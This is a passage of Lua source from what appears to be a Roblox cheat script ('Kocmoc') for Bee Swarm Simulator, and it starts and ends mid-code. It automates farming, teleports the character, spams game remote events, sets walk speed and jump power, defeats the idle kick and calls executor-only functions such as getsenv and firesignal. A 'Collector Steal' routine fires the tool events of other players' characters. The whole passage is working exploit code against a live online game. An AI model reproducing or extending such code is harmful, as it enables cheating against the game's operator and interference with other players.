    fieldsettings:CreateDropdown("Field", fieldstable, function(Option) temptable.blackfield = Option end)
    fieldsettings:CreateButton("Add Field To Blacklist", function() table.insert(kocmoc.blacklistedfields, temptable.blackfield) game:GetService("CoreGui"):FindFirstChild(_G.windowname).Main:FindFirstChild("Blacklisted Fields D",true):Destroy() fieldsettings:CreateDropdown("Blacklisted Fields", kocmoc.blacklistedfields, function(Option) end) end)
    fieldsettings:CreateButton("Remove Field From Blacklist", function() table.remove(kocmoc.blacklistedfields, api.tablefind(kocmoc.blacklistedfields, temptable.blackfield)) game:GetService("CoreGui"):FindFirstChild(_G.windowname).Main:FindFirstChild("Blacklisted Fields D",true):Destroy() fieldsettings:CreateDropdown("Blacklisted Fields", kocmoc.blacklistedfields, function(Option) end) end)
    fieldsettings:CreateDropdown("Blacklisted Fields", kocmoc.blacklistedfields, function(Option) end)
    local aqs = setttab:CreateSection("Auto Quest Settings")
    aqs:CreateDropdown("Do NPC Quests", {'All Quests', 'Bucko Bee', 'Brown Bear', 'Riley Bee', 'Polar Bear'}, function(Option) kocmoc.vars.npcprefer = Option end)
    aqs:CreateToggle("Teleport To NPC", nil, function(State) kocmoc.toggles.tptonpc = State end)
    local pts = setttab:CreateSection("Autofarm Priority Tokens")
    pts:CreateTextBox("Asset ID", 'rbxassetid', false, function(Value) rarename = Value end)
    pts:CreateButton("Add Token To Priority List", function() table.insert(kocmoc.priority, rarename) game:GetService("CoreGui"):FindFirstChild(_G.windowname).Main:FindFirstChild("Priority List D",true):Destroy() pts:CreateDropdown("Priority List", kocmoc.priority, function(Option) end) end)
    pts:CreateButton("Remove Token From Priority List", function() table.remove(kocmoc.priority, api.tablefind(kocmoc.priority, rarename)) game:GetService("CoreGui"):FindFirstChild(_G.windowname).Main:FindFirstChild("Priority List D",true):Destroy() pts:CreateDropdown("Priority List", kocmoc.priority, function(Option) end) end)
    pts:CreateDropdown("Priority List", kocmoc.priority, function(Option) end)
    
    loadingUI:UpdateText("Loaded UI")
    local loadingLoops = loadingInfo:CreateLabel("Loading Loops..")
    -- script
    
    local honeytoggleouyfyt = false
    task.spawn(function()
        while wait(1) do
            if kocmoc.toggles.honeymaskconv == true then
            if temptable.converting then
                if honeytoggleouyfyt == false then
                    honeytoggleouyfyt = true
                        game:GetService("ReplicatedStorage").Events.ItemPackageEvent:InvokeServer("Equip", {Mute=false;Type="Honey Mask";Category="Accessory"})
                end
            else
                if honeytoggleouyfyt == true then
                    honeytoggleouyfyt = false
                    game:GetService("ReplicatedStorage").Events.ItemPackageEvent:InvokeServer("Equip", {Mute=false;Type=kocmoc.vars.defmask;Category="Accessory"})
                end
            end
            end
        end
    end)
    
    task.spawn(function()
        while wait(5) do
            local buffs = fetchBuffTable(buffTable)
            for i,v in pairs(buffTable) do
                if v["b"] == true then
                    local inuse = false
                    for k,p in pairs(buffs) do
                        if k == i then inuse = true end
                    end
                    if inuse == false then
                        game:GetService("ReplicatedStorage").Events.PlayerActivesCommand:FireServer({["Name"]=i})
                    end
                end
            end
        end
    end)
    
    task.spawn(function() while task.wait(0.05) do
        if kocmoc.toggles.autofarm then
            --if kocmoc.toggles.farmcoco then getcoco() end
            --if kocmoc.toggles.collectcrosshairs then getcrosshairs() end
            if kocmoc.toggles.farmflame then getflame() end
            if kocmoc.toggles.farmfuzzy then getfuzzy() end
            if kocmoc.toggles.farmduped then getdupe() end
        end
    end end)
    
    game.Workspace.Particles.ChildAdded:Connect(function(v)
        if not temptable.started.vicious and not temptable.started.ant then
            if v.Name == "WarningDisk" and not temptable.started.vicious and kocmoc.toggles.autofarm and not temptable.started.ant and kocmoc.toggles.farmcoco and (v.Position-api.humanoidrootpart().Position).magnitude < temptable.magnitude and not temptable.converting then
                table.insert(temptable.coconuts, v)
                getcoco(v)
                gettoken()
            elseif v.Name == "Crosshair" and v ~= nil and v.BrickColor ~= BrickColor.new("Forest green") and not temptable.started.ant and v.BrickColor ~= BrickColor.new("Flint") and (v.Position-api.humanoidrootpart().Position).magnitude < temptable.magnitude and kocmoc.toggles.autofarm and kocmoc.toggles.collectcrosshairs and not temptable.converting then
                if #temptable.crosshairs <= 3 then
                    table.insert(temptable.crosshairs, v)
                    getcrosshairs(v)
                    gettoken()
                end
            end
        end
    end)
    
    task.spawn(function() while task.wait() do
            temptable.magnitude = 50
            if game.Players.LocalPlayer.Character:FindFirstChild("ProgressLabel",true) then
            local pollenprglbl = game.Players.LocalPlayer.Character:FindFirstChild("ProgressLabel",true)
            maxpollen = tonumber(pollenprglbl.Text:match("%d+$"))
            local pollencount = game.Players.LocalPlayer.CoreStats.Pollen.Value
            pollenpercentage = pollencount/maxpollen*100
            fieldselected = game:GetService("Workspace").FlowerZones[kocmoc.vars.field]
            
            if kocmoc.toggles.autouseconvertors == true then
            if tonumber(pollenpercentage) >= (kocmoc.vars.convertat - (kocmoc.vars.autoconvertWaitTime)) then
                    if not temptable.consideringautoconverting then
                    temptable.consideringautoconverting = true
                    spawn(function()
                        wait(kocmoc.vars.autoconvertWaitTime)
                        if tonumber(pollenpercentage) >= (kocmoc.vars.convertat - (kocmoc.vars.autoconvertWaitTime)) then
                            useConvertors()
                        end
                        temptable.consideringautoconverting = false
                    end)
                    end
                end
            end
            
            if kocmoc.toggles.autofarm then
            if kocmoc.toggles.autodoquest and game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.Menus.Children.Quests.Content:FindFirstChild("Frame") then
                for i,v in next, game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.Menus.Children.Quests:GetDescendants() do
                    if v.Name == "Description" then
                        if string.match(v.Parent.Parent.TitleBar.Text, kocmoc.vars.npcprefer) or kocmoc.vars.npcprefer == "All Quests" and not string.find(v.Text, "Puffshroom") then
                            pollentypes = {'White Pollen', "Red Pollen", "Blue Pollen", "Blue Flowers", "Red Flowers", "White Flowers"}
                            text = v.Text
                            if api.returnvalue(fieldstable, text) and not string.find(v.Text, "Complete!") and not api.findvalue(kocmoc.blacklistedfields, api.returnvalue(fieldstable, text)) then
                                d = api.returnvalue(fieldstable, text)
                                fieldselected = game:GetService("Workspace").FlowerZones[d]
                                break
                            elseif api.returnvalue(pollentypes, text) and not string.find(v.Text, 'Complete!') then
                                d = api.returnvalue(pollentypes, text)
                                if d == "Blue Flowers" or d == "Blue Pollen" then
                                    fieldselected = game:GetService("Workspace").FlowerZones[kocmoc.bestfields.blue]
                                    break
                                elseif d == "White Flowers" or d == "White Pollen" then
                                    fieldselected = game:GetService("Workspace").FlowerZones[kocmoc.bestfields.white]
                                    break
                                elseif d == "Red Flowers" or d == "Red Pollen" then
                                    fieldselected = game:GetService("Workspace").FlowerZones[kocmoc.bestfields.red]
                                    break
                                end
                            end
                        end
                    end
                end
            else
                fieldselected = game:GetService("Workspace").FlowerZones[kocmoc.vars.field]
            end
            fieldpos = CFrame.new(fieldselected.Position.X, fieldselected.Position.Y+3, fieldselected.Position.Z)
            fieldposition = fieldselected.Position
            if temptable.sprouts.detected and temptable.sprouts.coords and kocmoc.toggles.farmsprouts then
                fieldposition = temptable.sprouts.coords.Position
                fieldpos = temptable.sprouts.coords
            end
            if kocmoc.toggles.farmpuffshrooms and game.Workspace.Happenings.Puffshrooms:FindFirstChildOfClass("Model") then 
                if api.partwithnamepart("Mythic", game.Workspace.Happenings.Puffshrooms) then
                    temptable.magnitude = 25 
                    fieldpos = api.partwithnamepart("Mythic", game.Workspace.Happenings.Puffshrooms):FindFirstChild("Puffball Stem").CFrame
                    fieldposition = fieldpos.Position
                elseif api.partwithnamepart("Legendary", game.Workspace.Happenings.Puffshrooms) then
                    temptable.magnitude = 25 
                    fieldpos = api.partwithnamepart("Legendary", game.Workspace.Happenings.Puffshrooms):FindFirstChild("Puffball Stem").CFrame
                    fieldposition = fieldpos.Position
                elseif api.partwithnamepart("Epic", game.Workspace.Happenings.Puffshrooms) then
                    temptable.magnitude = 25 
                    fieldpos = api.partwithnamepart("Epic", game.Workspace.Happenings.Puffshrooms):FindFirstChild("Puffball Stem").CFrame
                    fieldposition = fieldpos.Position
                elseif api.partwithnamepart("Rare", game.Workspace.Happenings.Puffshrooms) then
                    temptable.magnitude = 25 
                    fieldpos = api.partwithnamepart("Rare", game.Workspace.Happenings.Puffshrooms):FindFirstChild("Puffball Stem").CFrame
                    fieldposition = fieldpos.Position
                else
                    temptable.magnitude = 25 
                    fieldpos = api.getbiggestmodel(game.Workspace.Happenings.Puffshrooms):FindFirstChild("Puffball Stem").CFrame
                    fieldposition = fieldpos.Position
                end
            end
            
            if (tonumber(pollenpercentage) < tonumber(kocmoc.vars.convertat)) or (kocmoc.toggles.disableconversion == true) then
                if not temptable.tokensfarm then
                    api.tween(2, fieldpos)
                    task.wait(2)
                    temptable.tokensfarm = true
                    if kocmoc.toggles.autosprinkler then makesprinklers() end
                else
                    if kocmoc.toggles.killmondo then
                        while kocmoc.toggles.killmondo and game.Workspace.Monsters:FindFirstChild("Mondo Chick (Lvl 8)") and not temptable.started.vicious and not temptable.started.monsters do
                            temptable.started.mondo = true
                            while game.Workspace.Monsters:FindFirstChild("Mondo Chick (Lvl 8)") do
                                disableall()
                                game:GetService("Workspace").Map.Ground.HighBlock.CanCollide = false 
                                mondopition = game.Workspace.Monsters["Mondo Chick (Lvl 8)"].Head.Position
                                api.tween(1, CFrame.new(mondopition.x, mondopition.y - 60, mondopition.z))
                                task.wait(1)
                                temptable.float = true
                            end
                            task.wait(0.5) game:GetService("Workspace").Map.Ground.HighBlock.CanCollide = true temptable.float = false api.tween(0.5, CFrame.new(73.2, 176.35, -167)) task.wait(1)
                            for i = 0, 50 do 
                                gettoken(CFrame.new(73.2, 176.35, -167).Position) 
                            end 
                            enableall() 
                            api.tween(2, fieldpos) 
                            temptable.started.mondo = false
                        end
                    end
                    if (fieldposition-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude > temptable.magnitude then
                        api.tween(0.1, fieldpos)
                        task.wait(2)
                        if kocmoc.toggles.autosprinkler then makesprinklers() end
                    end
                    getprioritytokens()
                    if kocmoc.toggles.avoidmobs then avoidmob() end
                    if kocmoc.toggles.farmclosestleaf then closestleaf() end
                    if kocmoc.toggles.farmbubbles then getbubble() end
                    if kocmoc.toggles.farmclouds then getcloud() end
                    if kocmoc.toggles.farmunderballoons then getballoons() end
                    if not kocmoc.toggles.donotfarmtokens and done then gettoken() end
                    if not kocmoc.toggles.farmflower then getflower() end
                end
            elseif tonumber(pollenpercentage) >= tonumber(kocmoc.vars.convertat) then
                if not kocmoc.toggles.disableconversion then
                temptable.tokensfarm = false
                api.tween(2, game:GetService("Players").LocalPlayer.SpawnPos.Value * CFrame.fromEulerAnglesXYZ(0, 110, 0) + Vector3.new(0, 0, 9))
                task.wait(2)
                temptable.converting = true
                repeat
                    converthoney()
                until game.Players.LocalPlayer.CoreStats.Pollen.Value == 0
                if kocmoc.toggles.convertballoons and gethiveballoon() then
                    task.wait(6)
                    repeat
                        task.wait()
                        converthoney()
                    until gethiveballoon() == false or not kocmoc.toggles.convertballoons
                end
                temptable.converting = false
                temptable.act = temptable.act + 1
                task.wait(6)
                if kocmoc.toggles.autoant and not game:GetService("Workspace").Toys["Ant Challenge"].Busy.Value and rtsg().Eggs.AntPass > 0 then farmant() end
                if kocmoc.toggles.autoquest then makequests() end
                if kocmoc.toggles.autoplanters then collectplanters() end
                if kocmoc.toggles.autokillmobs then 
                    if temptable.act >= kocmoc.vars.monstertimer then
                        temptable.started.monsters = true
                        temptable.act = 0
                        killmobs() 
                        temptable.started.monsters = false
                    end
                end
                if kocmoc.vars.resetbeeenergy then
                --rconsoleprint("Act2:-"..tostring(temptable.act2))
                if temptable.act2 >= kocmoc.vars.resettimer then
                    temptable.started.monsters = true
                    temptable.act2 = 0
                    repeat wait() until workspace:FindFirstChild(game.Players.LocalPlayer.Name) and workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid") and workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid").Health > 0
                    workspace:FindFirstChild(game.Players.LocalPlayer.Name):BreakJoints()
                    wait(6.5)
                    repeat wait() until workspace:FindFirstChild(game.Players.LocalPlayer.Name)
                    workspace:FindFirstChild(game.Players.LocalPlayer.Name):BreakJoints()
                    wait(6.5)
                    repeat wait() until workspace:FindFirstChild(game.Players.LocalPlayer.Name)
                    temptable.started.monsters = false
                end
            end
            end
        end
    end end end end)
    
    task.spawn(function()
        while task.wait(1) do
            if kocmoc.toggles.killvicious and temptable.detected.vicious and temptable.converting == false and not temptable.started.monsters then
                temptable.started.vicious = true
                disableall()
                local vichumanoid = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
                for i,v in next, game.workspace.Particles:GetChildren() do
                    for x in string.gmatch(v.Name, "Vicious") do
                        if string.find(v.Name, "Vicious") then
                            api.tween(1,CFrame.new(v.Position.x, v.Position.y, v.Position.z)) task.wait(1)
                            api.tween(0.5, CFrame.new(v.Position.x, v.Position.y, v.Position.z)) task.wait(0.5)
                        end
                    end
                end
                for i,v in next, game.workspace.Particles:GetChildren() do
                    for x in string.gmatch(v.Name, "Vicious") do
                        while kocmoc.toggles.killvicious and temptable.detected.vicious do task.wait() if string.find(v.Name, "Vicious") then
                            for i=1, 4 do temptable.float = true vichumanoid.CFrame = CFrame.new(v.Position.x+10, v.Position.y, v.Position.z) task.wait(0.3)
                            end
                        end end
                    end
                end
                enableall()
                task.wait(1)
                temptable.float = false
                temptable.started.vicious = false
            end
        end
    end)
    
    task.spawn(function() while task.wait() do
        if kocmoc.toggles.killwindy and temptable.detected.windy and not temptable.converting and not temptable.started.vicious and not temptable.started.mondo and not temptable.started.monsters then
            temptable.started.windy = true
            wlvl = "" aw = false awb = false -- some variable for autowindy, yk?
            disableall()
            while kocmoc.toggles.killwindy and temptable.detected.windy do
                if not aw then
                    for i,v in pairs(workspace.Monsters:GetChildren()) do
                        if string.find(v.Name, "Windy") then wlvl = v.Name aw = true -- we found windy!
                        end
                    end
                end
                if aw then
                    for i,v in pairs(workspace.Monsters:GetChildren()) do
                        if string.find(v.Name, "Windy") then
                            if v.Name ~= wlvl then
                                temptable.float = false task.wait(5) for i =1, 5 do gettoken(api.humanoidrootpart().Position) end -- collect tokens :yessir:
                                wlvl = v.Name
                            end
                        end
                    end
                end
                if not awb then api.tween(1,temptable.gacf(temptable.windy, 5)) task.wait(1) awb = true end
                if awb and temptable.windy.Name == "Windy" then
                    api.humanoidrootpart().CFrame = temptable.gacf(temptable.windy, 25) temptable.float = true task.wait()
                end
            end 
            enableall()
            temptable.float = false
            temptable.started.windy = false
        end
    end end)
    
    local function collectorSteal()
        if kocmoc.vars.autodigmode == "Collector Steal" then
            for i,v in pairs(game.Players:GetChildren()) do
                if v.Name ~= game.Players.LocalPlayer.Name then
                    if v then
                        if v.Character then
                            if v.Character:FindFirstChildWhichIsA("Tool") then
                                if v.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("ClickEvent") then
                        v.Character:FindFirstChildWhichIsA("Tool").ClickEvent:FireServer()
                    end
                end
            end
            end
            end
            end
        end
    end
    
    task.spawn(function() while task.wait(0.05) do
        if kocmoc.toggles.farmrares then for k,v in next, game.workspace.Collectibles:GetChildren() do if v.CFrame.YVector.Y == 1 then if v.Transparency == 0 then decal = v:FindFirstChildOfClass("Decal") for e,r in next, kocmoc.rares do if decal.Texture == r or decal.Texture == "rbxassetid://"..r then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame break end end end end end end
        if kocmoc.toggles.autodig then
        pcall(function()
        if game.Players.LocalPlayer then 
            if game.Players.LocalPlayer.Character then 
                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then 
                    if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("ClickEvent", true) then 
                    tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") or nil 
                    end 
                end 
            end 
        if tool then getsenv(tool.ClientScriptMouse).collectStart(game:GetService("Players").LocalPlayer:GetMouse()) end end collectorSteal() workspace.NPCs.Onett.Onett["Porcelain Dipper"].ClickEvent:FireServer() end) end
    end end)
    
    game:GetService("Workspace").Particles.Folder2.ChildAdded:Connect(function(child)
        if child.Name == "Sprout" then
            temptable.sprouts.detected = true
            temptable.sprouts.coords = child.CFrame
        end
    end)
    game:GetService("Workspace").Particles.Folder2.ChildRemoved:Connect(function(child)
        if child.Name == "Sprout" then
            task.wait(30)
            temptable.sprouts.detected = false
            temptable.sprouts.coords = ""
        end
    end)
    
    Workspace.Particles.ChildAdded:Connect(function(instance)
        if string.find(instance.Name, "Vicious") then
            temptable.detected.vicious = true
        end
    end)
    Workspace.Particles.ChildRemoved:Connect(function(instance)
        if string.find(instance.Name, "Vicious") then
            temptable.detected.vicious = false
        end
    end)
    game:GetService("Workspace").NPCBees.ChildAdded:Connect(function(v)
        if v.Name == "Windy" then
            task.wait(3) temptable.windy = v temptable.detected.windy = true
        end
    end)
    game:GetService("Workspace").NPCBees.ChildRemoved:Connect(function(v)
        if v.Name == "Windy" then
            task.wait(3) temptable.windy = nil temptable.detected.windy = false
        end
    end)
    
    task.spawn(function() while task.wait(0.1) do
        if not temptable.converting then
            if kocmoc.toggles.autosamovar then
                game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Samovar")
                platformm = game:GetService("Workspace").Toys.Samovar.Platform
                for i,v in pairs(game.Workspace.Collectibles:GetChildren()) do
                    if (v.Position-platformm.Position).magnitude < 25 and v.CFrame.YVector.Y == 1 then
                        api.humanoidrootpart().CFrame = v.CFrame
                    end
                end
            end
            if kocmoc.toggles.autosnowmachines then
                game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Snow Machine")
            end
            if kocmoc.toggles.autostockings then
                game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Stockings")
                platformm = game:GetService("Workspace").Toys.Stockings.Platform
                for i,v in pairs(game.Workspace.Collectibles:GetChildren()) do
                    if (v.Position-platformm.Position).magnitude < 25 and v.CFrame.YVector.Y == 1 then
                        api.humanoidrootpart().CFrame = v.CFrame
                    end
                end
            end
                    if kocmoc.toggles.autowreath then
                game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Honey Wreath")
                platformm = game:GetService("Workspace").Toys["Honey Wreath"].Platform
                for i,v in pairs(game.Workspace.Collectibles:GetChildren()) do
                    if (v.Position-platformm.Position).magnitude < 25 and v.CFrame.YVector.Y == 1 then
                        api.humanoidrootpart().CFrame = v.CFrame
                    end
                end
            end
            if kocmoc.toggles.autoonettart then
                game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Onett's Lid Art")
                platformm = game:GetService("Workspace").Toys["Onett's Lid Art"].Platform
                for i,v in pairs(game.Workspace.Collectibles:GetChildren()) do
                    if (v.Position-platformm.Position).magnitude < 25 and v.CFrame.YVector.Y == 1 then
                        api.humanoidrootpart().CFrame = v.CFrame
                    end
                end
            end
            if kocmoc.toggles.autocandles then
                game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Honeyday Candles")
                platformm = game:GetService("Workspace").Toys["Honeyday Candles"].Platform
                for i,v in pairs(game.Workspace.Collectibles:GetChildren()) do
                    if (v.Position-platformm.Position).magnitude < 25 and v.CFrame.YVector.Y == 1 then
                        api.humanoidrootpart().CFrame = v.CFrame
                    end
                end
            end
            if kocmoc.toggles.autofeast then
                game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Beesmas Feast")
                platformm = game:GetService("Workspace").Toys["Beesmas Feast"].Platform
                for i,v in pairs(game.Workspace.Collectibles:GetChildren()) do
                    if (v.Position-platformm.Position).magnitude < 25 and v.CFrame.YVector.Y == 1 then
                        api.humanoidrootpart().CFrame = v.CFrame
                    end
                end
            end
            if kocmoc.toggles.autodonate then
                if isWindshrineOnCooldown() == false then
                donateToShrine(kocmoc.vars.donoItem,kocmoc.vars.donoAmount)
                end
            end
        end
    end end)
    
    task.spawn(function() while task.wait(1) do
        temptable.runningfor = temptable.runningfor + 1
        temptable.honeycurrent = statsget().Totals.Honey
        if kocmoc.toggles.honeystorm then game.ReplicatedStorage.Events.ToyEvent:FireServer("Honeystorm") end
        if kocmoc.toggles.collectgingerbreads then game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Gingerbread House") end
        if kocmoc.toggles.autodispense then
            if kocmoc.dispensesettings.rj then local A_1 = "Free Royal Jelly Dispenser" local Event = game:GetService("ReplicatedStorage").Events.ToyEvent Event:FireServer(A_1) end
            if kocmoc.dispensesettings.blub then game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Blueberry Dispenser") end
            if kocmoc.dispensesettings.straw then game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Strawberry Dispenser") end
            if kocmoc.dispensesettings.treat then game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Treat Dispenser") end
            if kocmoc.dispensesettings.coconut then game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Coconut Dispenser") end
            if kocmoc.dispensesettings.glue then game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Glue Dispenser") end
        end
        if kocmoc.toggles.autoboosters then 
            if kocmoc.dispensesettings.white then game.ReplicatedStorage.Events.ToyEvent:FireServer("Field Booster") end
            if kocmoc.dispensesettings.red then game.ReplicatedStorage.Events.ToyEvent:FireServer("Red Field Booster") end
            if kocmoc.dispensesettings.blue then game.ReplicatedStorage.Events.ToyEvent:FireServer("Blue Field Booster") end
        end
        if kocmoc.toggles.clock then game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Wealth Clock") end
        if kocmoc.toggles.freeantpass then game:GetService("ReplicatedStorage").Events.ToyEvent:FireServer("Free Ant Pass Dispenser") end
        gainedhoneylabel:UpdateText("Gained Honey: "..api.suffixstring(temptable.honeycurrent - temptable.honeystart))
    end end)
    
    game:GetService('RunService').Heartbeat:connect(function() 
        if kocmoc.toggles.autoquest then firesignal(game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.NPC.ButtonOverlay.MouseButton1Click) end
        if kocmoc.toggles.loopspeed then game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = kocmoc.vars.walkspeed end
        if kocmoc.toggles.loopjump then game.Players.LocalPlayer.Character.Humanoid.JumpPower = kocmoc.vars.jumppower end
    end)
    
    game:GetService('RunService').Heartbeat:connect(function()
        for i,v in next, game.Players.LocalPlayer.PlayerGui.ScreenGui:WaitForChild("MinigameLayer"):GetChildren() do for k,q in next, v:WaitForChild("GuiGrid"):GetDescendants() do if q.Name == "ObjContent" or q.Name == "ObjImage" then q.Visible = true end end end
    end)
    
    game:GetService('RunService').Heartbeat:connect(function() 
        if temptable.float then game.Players.LocalPlayer.Character.Humanoid.BodyTypeScale.Value = 0 floatpad.CanCollide = true floatpad.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y-3.75, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z) task.wait(0)  else floatpad.CanCollide = false end
    end)
    
    local vu = game:GetService("VirtualUser")
    game:GetService("Players").LocalPlayer.Idled:connect(function() vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)task.wait(1)vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    end)
    
    local canTeleport = true
    game:GetService("Workspace").Particles.Snowflakes.ChildAdded:Connect(function(snowflake)
        if canTeleport == true and kocmoc.toggles.farmsnowflakes == true then
            local hash = tostring(math.random(1,10000))
            snowflake.Name = hash
            canTeleport = false
            repeat
               wait()
               getgenv().temptable.float = true
               game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = snowflake.CFrame + Vector3.new(0,7.5,0)
            until game:GetService("Workspace").Particles.Snowflakes:FindFirstChild(hash) == nil
            getgenv().temptable.float = false
            wait(1)
            canTeleport = true
        end
    end)
    
    game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
        humanoid = char:WaitForChild("Humanoid")
        humanoid.Died:Connect(function()
            if kocmoc.toggles.autofarm then
                temptable.dead = true
                kocmoc.toggles.autofarm = false
                temptable.converting = false
                temptable.farmtoken = false
            end
            if temptable.dead then
                task.wait(25)
                temptable.dead = false
                kocmoc.toggles.autofarm = true local player = game.Players.LocalPlayer
                temptable.converting = false
                temptable.tokensfarm = true
            end
        end)
    end)
    
    for _,v in next, game.workspace.Collectibles:GetChildren() do
        if string.find(v.Name,"") then
            v:Destroy()
        end
    end 
    
    task.spawn(function() while task.wait() do
        pos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
        task.wait(0.00001)
        currentSpeed = (pos-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude
        if currentSpeed > 0 then
            temptable.running = true
        else
            temptable.running = false
        end
    end end)
    
    loadingLoops:UpdateText("Loaded Loops")
    
    local function getMonsterName(name)
        local newName = nil
        local keywords = {
            ["Mushroom"]="Ladybug";
            ["Rhino"]="Rhino Beetle";
            ["Spider"]="Spider";
            ["Ladybug"]="Ladybug";
            ["Scorpion"]="Scorpion";
            ["Mantis"]="Mantis";
            ["Beetle"]="Rhino Beetle";
            ["Tunnel"]="Tunnel Bear";
            ["Coco"]="Coconut Crab";
            ["King"]="King Beetle";
            ["Stump"]="Stump Snail";
            ["Were"]="Werewolf"
        }
        for i,v in pairs(keywords) do
            if string.find(string.upper(name),string.upper(i)) then
                newName = v
            end
        end
        if newName == nil then newName = name end
        return newName
    end
    
    local function getNearestField(part)
        local resultingFieldPos
        local lowestMag = math.huge
        for i,v in pairs(game:GetService("Workspace").FlowerZones:GetChildren()) do
            if (v.Position - part.Position).magnitude < lowestMag then
                lowestMag = (v.Position - part.Position).magnitude
                resultingFieldPos = v.Position
            end
        end
        if lowestMag > 100 then resultingFieldPos = part.Position + Vector3.new(0,0,10) end
        if string.find(part.Name,"Tunnel") then resultingFieldPos = part.Position + Vector3.new(20,-70,0) end
        return resultingFieldPos
    end
    
    local function fetchVisualMonsterString(v)
        local mobText = nil
                if v:FindFirstChild("Attachment") then
                if v:FindFirstChild("Attachment"):FindFirstChild("TimerGui") then
                    if v:FindFirstChild("Attachment"):FindFirstChild("TimerGui"):FindFirstChild("TimerLabel") then
                        if v:FindFirstChild("Attachment"):FindFirstChild("TimerGui"):FindFirstChild("TimerLabel").Visible == true then
                            local splitTimer = string.split(v:FindFirstChild("Attachment"):FindFirstChild("TimerGui"):FindFirstChild("TimerLabel").Text," ")
                            if splitTimer[3] ~= nil then
                                mobText = getMonsterName(v.Name) .. ": " .. splitTimer[3]
                            elseif splitTimer[2] ~= nil then
                                mobText = getMonsterName(v.Name) .. ": " .. splitTimer[2]
                            else
                                mobText = getMonsterName(v.Name) .. ": " .. splitTimer[1]
                            end
                        else
                            mobText = getMonsterName(v.Name) .. ": Ready"
                        end
                    end
                end
            end
        return mobText
    end
    
    local function getToyCooldown(toy)
    local c = require(game.ReplicatedStorage.ClientStatCache):Get()
    local name = toy
    local t = workspace.OsTime.Value - c.ToyTimes[name]
    local cooldown = workspace.Toys[name].Cooldown.Value
    local u = cooldown - t
    local canBeUsed = false
    if string.find(tostring(u),"-") then canBeUsed = true end
    return u,canBeUsed
    end
    
    task.spawn(function()
        pcall(function()
        loadingInfo:CreateLabel("")
        loadingInfo:CreateLabel("Script loaded!")
        wait(2)
        pcall(function()
        for i,v in pairs(game.CoreGui:GetDescendants()) do
            if v.Name == "Startup S" then
                v.Parent.Parent.RightSide["Information S"].Parent = v.Parent
                v:Destroy()
            end
        end
        end)
        local panel = hometab:CreateSection("Mob Panel")
        local statusTable = {}
        for i,v in pairs(game:GetService("Workspace").MonsterSpawners:GetChildren()) do
            if not string.find(v.Name,"CaveMonster") then
            local mobText = nil
            mobText = fetchVisualMonsterString(v)
            if mobText ~= nil then
                local mob = panel:CreateButton(mobText,function()
                    api.tween(1,CFrame.new(getNearestField(v)))
                end)
                table.insert(statusTable,{mob,v})
            end
            end
        end
        local mob2 = panel:CreateButton("Mondo Chick: 00:00",function() api.tween(1,game:GetService("Workspace").FlowerZones["Mountain Top Field"].CFrame) end)
        local panel2 = hometab:CreateSection("Utility Panel")
        local windUpd = panel2:CreateButton("Wind Shrine: 00:00",function() api.tween(1,CFrame.new(game:GetService("Workspace").NPCs["Wind Shrine"].Circle.Position + Vector3.new(0,5,0))) end)
        local rfbUpd = panel2:CreateButton("Red Field Booster: 00:00",function() api.tween(1,CFrame.new(game:GetService("Workspace").Toys["Red Field Booster"].Platform.Position + Vector3.new(0,5,0))) end)
        local bfbUpd = panel2:CreateButton("Blue Field Booster: 00:00",function() api.tween(1,CFrame.new(game:GetService("Workspace").Toys["Blue Field Booster"].Platform.Position + Vector3.new(0,5,0))) end)
        local wfbUpd = panel2:CreateButton("White Field Booster: 00:00",function() api.tween(1,CFrame.new(game:GetService("Workspace").Toys["Field Booster"].Platform.Position + Vector3.new(0,5,0))) end)
        local cocoDispUpd = panel2:CreateButton("Coconut Dispenser: 00:00",function() api.tween(1,CFrame.new(game:GetService("Workspace").Toys["Coconut Dispenser"].Platform.Position + Vector3.new(0,5,0))) end)
        local ic1 = panel2:CreateButton("Instant Converter A: 00:00",function() api.tween(1,CFrame.new(game:GetService("Workspace").Toys["Instant Converter"].Platform.Position + Vector3.new(0,5,0))) end)
        local ic2 = panel2:CreateButton("Instant Converter B: 00:00",function() api.tween(1,CFrame.new(game:GetService("Workspace").Toys["Instant Converter B"].Platform.Position + Vector3.new(0,5,0))) end)
        local ic3 = panel2:CreateButton("Instant Converter C: 00:00",function() api.tween(1,CFrame.new(game:GetService("Workspace").Toys["Instant Converter C"].Platform.Position + Vector3.new(0,5,0))) end)
